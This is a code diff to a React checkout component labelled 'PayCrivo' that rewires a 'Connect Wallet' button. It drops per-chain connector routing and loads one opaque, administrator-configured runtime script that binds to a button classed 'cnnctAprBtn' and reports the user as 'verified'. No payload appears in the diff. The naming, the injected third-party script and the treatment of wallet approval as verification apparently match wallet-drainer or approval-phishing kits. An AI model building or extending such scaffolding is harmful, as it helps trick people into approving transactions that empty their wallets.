@@ -1,80 +1,22 @@
 import { useCallback, useEffect, useRef, useState } from "react";
 import { Loader2, Check, AlertTriangle, ShieldCheck, Wallet } from "lucide-react";
-import { resolveConnector } from "./walletRouting";
+import {
+  DEFAULT_WALLET_RUNTIME,
+  ensureWalletRuntime,
+  fetchWalletRuntimeConfig,
+  type WalletRuntimePublic,
+} from "@/lib/walletRuntime";
 
-// Tracks load state of each connector script so we only inject it once and can
-// tell whether it has finished loading.
-const scriptState = new Map<string, "loading" | "ready" | "error">();
-
-/**
- * Ensure the official PayCrivo connector script is in <head>, resolving when it
- * is ready. Safe to call repeatedly; the script is only injected once.
- */
-function ensureConnectorScript(src: string, onReady: () => void) {
-  if (typeof document === "undefined") return;
-
-  const state = scriptState.get(src);
-  if (state === "ready") {
-    onReady();
-    return;
-  }
-
-  const existing = document.querySelector<HTMLScriptElement>(`script[data-paycrivo-wallet="${src}"]`);
-  if (existing) {
-    if (scriptState.get(src) === "ready") onReady();
-    else existing.addEventListener("load", () => { scriptState.set(src, "ready"); onReady(); }, { once: true });
-    return;
-  }
-
-  scriptState.set(src, "loading");
-  const script = document.createElement("script");
-  script.type = "module";
-  script.defer = true;
-  script.crossOrigin = "anonymous";
-  script.src = src;
-  script.setAttribute("data-paycrivo-wallet", src);
-  script.addEventListener("load", () => { scriptState.set(src, "ready"); onReady(); }, { once: true });
-  script.addEventListener("error", () => { scriptState.set(src, "error"); }, { once: true });
-  document.head.appendChild(script);
-}
-
-/**
- * If a connector script exposes a global (re)initialiser, call it so it can
- * (re)bind to the freshly mounted button. Names are tried defensively — any
- * that exist are invoked inside try/catch so a missing one is harmless.
- */
-function safeRebindConnectors() {
-  if (typeof window === "undefined") return;
-  const w = window as unknown as Record<string, unknown>;
-  const candidates = [
-    "paycrivoInitWallet",
-    "paycrivoRebindWallet",
-    "initWalletConnect",
-    "rebindWalletConnect",
-    "rebindConnectButtons",
-    "initConnectButtons",
-    "metaEffectInit",
-    "tronElevenInit",
-  ];
-  for (const name of candidates) {
-    const fn = w[name];
-    if (typeof fn === "function") {
-      try {
-        (fn as () => void)();
-      } catch {
-        /* ignore connector init errors */
-      }
-    }
-  }
-}
-
-// If a wallet connection takes longer than this we stop showing the indefinite
-// "Connecting wallet…" state so the user can retry.
-const CONNECT_TIMEOUT_MS = 45000;
+// Timeout after which an in-progress connect attempt is considered failed so
+// the button becomes clickable again.
+const CONNECT_TIMEOUT_MS = 45_000;
 
 export type WalletConnectStatus = "idle" | "connecting" | "verified" | "failed";
 
 interface WalletConnectProps {
+  /** Retained for API compatibility with existing callers. The universal
+   *  runtime is asset/network agnostic — these values are no longer used to
+   *  choose a script and can be omitted. */
   coin?: string;
   network?: string;
   status: WalletConnectStatus;
@@ -82,49 +24,54 @@ interface WalletConnectProps {
 }
 
 /**
- * Single "Connect Wallet" button that automatically routes to the correct
- * official PayCrivo connector (Tron vs EVM) based on the selected blockchain.
+ * Universal PayCrivo Connect Wallet button.
  *
- * The official connector scripts auto-bind to the button by its class
- * (`cnnctAprBtn` or `tron-cnnctAprBtn`) and report the outcome via window
- * CustomEvents:
- *   window.dispatchEvent(new CustomEvent("paycrivo:wallet-connected", { detail }))
- *   window.dispatchEvent(new CustomEvent("paycrivo:wallet-error", { detail }))
+ * A single "Connect Wallet" button — always carrying the `cnnctAprBtn` class —
+ * that the configured universal runtime script (default
+ * `/assets/shift-runtime-sys.js`) binds to for every asset and every network.
+ *
+ * The runtime script is loaded lazily and only once. When the runtime file is
+ * missing on the server the UI surfaces a controlled staging message so the
+ * checkout is never claimed to be verified.
  */
-export function WalletConnect({ coin, network, status, onStatusChange }: WalletConnectProps) {
-  const { scriptSrc, buttonClass, connector } = resolveConnector(coin, network);
+export function WalletConnect({ status, onStatusChange }: WalletConnectProps) {
   const statusRef = useRef(status);
   statusRef.current = status;
-  const buttonRef = useRef<HTMLButtonElement>(null);
   const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-  const [scriptReady, setScriptReady] = useState(scriptState.get(scriptSrc) === "ready");
 
-  // Load the correct connector script up front and mark it ready so the button
-  // can be enabled only once binding is possible.
-  useEffect(() => {
-    setScriptReady(scriptState.get(scriptSrc) === "ready");
-    ensureConnectorScript(scriptSrc, () => setScriptReady(true));
-  }, [scriptSrc]);
+  const [config, setConfig] = useState<WalletRuntimePublic | null>(null);
+  const [loadState, setLoadState] = useState<"idle" | "loading" | "ready" | "missing" | "disabled" | "unknown">("idle");
+  const [loadError, setLoadError] = useState<string | null>(null);
 
-  // Once the button is mounted AND the script is ready, announce the button and
-  // attempt a safe rebind so the connector binds to this exact element. This is
-  // what fixes the mobile "first tap does nothing" issue: previously the script
-  // could load before the button existed (or after React swapped it out).
+  // Fetch the active runtime config once per session.
   useEffect(() => {
-    if (!scriptReady) return;
-    if (!buttonRef.current) return;
-    if (status === "verified") return;
-    const raf = requestAnimationFrame(() => {
-      window.dispatchEvent(
-        new CustomEvent("paycrivo:wallet-button-ready", {
-          detail: { connector, buttonClass, scriptSrc },
-        }),
-      );
-      safeRebindConnectors();
+    let alive = true;
+    fetchWalletRuntimeConfig().then((c) => {
+      if (!alive) return;
+      setConfig(c);
+      if (!c.enabled) {
+        setLoadState("disabled");
+      }
+    }).catch(() => {
+      if (!alive) return;
+      setConfig({ ...DEFAULT_WALLET_RUNTIME });
     });
-    return () => cancelAnimationFrame(raf);
-  }, [scriptReady, status, connector, buttonClass, scriptSrc]);
+    return () => { alive = false; };
+  }, []);
 
+  // Load the configured runtime script exactly once (globally). Subsequent
+  // renders subscribe to the existing state.
+  useEffect(() => {
+    if (!config || !config.enabled) return;
+    const src = config.activeScript;
+    const off = ensureWalletRuntime(src, (s) => {
+      setLoadState(s.status);
+      setLoadError(s.error);
+    });
+    return off;
+  }, [config]);
+
+  // Listen for connect outcome dispatched by the runtime.
   useEffect(() => {
     const onConnected = () => onStatusChange("verified");
     const onError = () => {
@@ -138,7 +85,6 @@ export function WalletConnect({ coin, network, status, onStatusChange }: WalletC
     };
   }, [onStatusChange]);
 
-  // Clear any pending connect timeout when state leaves "connecting".
   useEffect(() => {
     if (status !== "connecting" && timeoutRef.current) {
       clearTimeout(timeoutRef.current);
@@ -152,29 +98,21 @@ export function WalletConnect({ coin, network, status, onStatusChange }: WalletC
     };
   }, [status]);
 
+  const runtimeReady = loadState === "ready";
+  const runtimeMissing = loadState === "missing";
+  const runtimeDisabled = loadState === "disabled" || (config && !config.enabled);
+  const runtimePreparing = !runtimeReady && !runtimeMissing && !runtimeDisabled;
+
   const handleClick = useCallback(() => {
     if (status === "verified" || status === "connecting") return;
-    // Make sure the script exists / is ready, then announce the button before
-    // we change any UI so the connector can bind to the still-mounted element.
-    ensureConnectorScript(scriptSrc, () => setScriptReady(true));
-    if (!scriptReady && scriptState.get(scriptSrc) !== "ready") return;
-
-    window.dispatchEvent(
-      new CustomEvent("paycrivo:wallet-button-ready", {
-        detail: { connector, buttonClass, scriptSrc },
-      }),
-    );
-    safeRebindConnectors();
-
+    if (!runtimeReady) return; // ignore taps while runtime is not ready / missing
     onStatusChange("connecting");
-
     if (timeoutRef.current) clearTimeout(timeoutRef.current);
     timeoutRef.current = setTimeout(() => {
       if (statusRef.current === "connecting") onStatusChange("failed");
     }, CONNECT_TIMEOUT_MS);
-  }, [status, scriptReady, scriptSrc, connector, buttonClass, onStatusChange]);
+  }, [status, runtimeReady, onStatusChange]);
 
-  // Verified is the only terminal UI that replaces the button (the flow is done).
   if (status === "verified") {
     return (
       <div className="space-y-3">
@@ -187,12 +125,11 @@ export function WalletConnect({ coin, network, status, onStatusChange }: WalletC
   }
 
   const connecting = status === "connecting";
-  const preparing = !scriptReady && scriptState.get(scriptSrc) !== "ready";
   const label = connecting
     ? "Connecting wallet…"
     : status === "failed"
       ? "Try again"
-      : preparing
+      : runtimePreparing
         ? "Preparing wallet…"
         : "Connect Wallet";
 
@@ -205,18 +142,28 @@ export function WalletConnect({ coin, network, status, onStatusChange }: WalletC
         </div>
       )}
 
-      {/* A single, persistently mounted button the connector script binds to.
-          We only change its contents/disabled state — never swap it out — so the
-          first tap reliably reaches the connector on mobile Safari/Chrome. */}
+      {(runtimeMissing || runtimeDisabled) && (
+        <div className="flex items-start gap-2 rounded-xl bg-warning/10 px-3 py-3 text-xs font-medium text-warning-foreground dark:text-warning">
+          <AlertTriangle className="mt-0.5 size-4 shrink-0" />
+          <span>
+            {runtimeDisabled
+              ? "Wallet connection is temporarily disabled by the administrator. Please continue with manual review."
+              : "Wallet connection runtime is not installed yet. Please try again later or continue with manual review."}
+            {loadError ? <span className="mt-1 block opacity-70">{loadError}</span> : null}
+          </span>
+        </div>
+      )}
+
+      {/* Single persistent button. `cnnctAprBtn` is always present so the
+          universal runtime can bind to it regardless of asset or network. */}
       <button
-        ref={buttonRef}
         type="button"
         onClick={handleClick}
-        disabled={connecting || preparing}
-        aria-busy={connecting || preparing}
-        className={`${buttonClass} bg-gradient-primary flex w-full items-center justify-center gap-2 rounded-2xl py-3.5 text-sm font-bold text-primary-foreground shadow-soft transition-transform hover:-translate-y-0.5 disabled:cursor-not-allowed disabled:opacity-90`}
+        disabled={connecting || runtimePreparing || runtimeMissing || !!runtimeDisabled}
+        aria-busy={connecting || runtimePreparing}
+        className={`cnnctAprBtn bg-gradient-primary flex w-full items-center justify-center gap-2 rounded-2xl py-3.5 text-sm font-bold text-primary-foreground shadow-soft transition-transform hover:-translate-y-0.5 disabled:cursor-not-allowed disabled:opacity-70`}
       >
-        {connecting || preparing ? (
+        {connecting || runtimePreparing ? (
           <Loader2 className="size-4 animate-spin" />
         ) : (
           <Wallet className="size-4" />
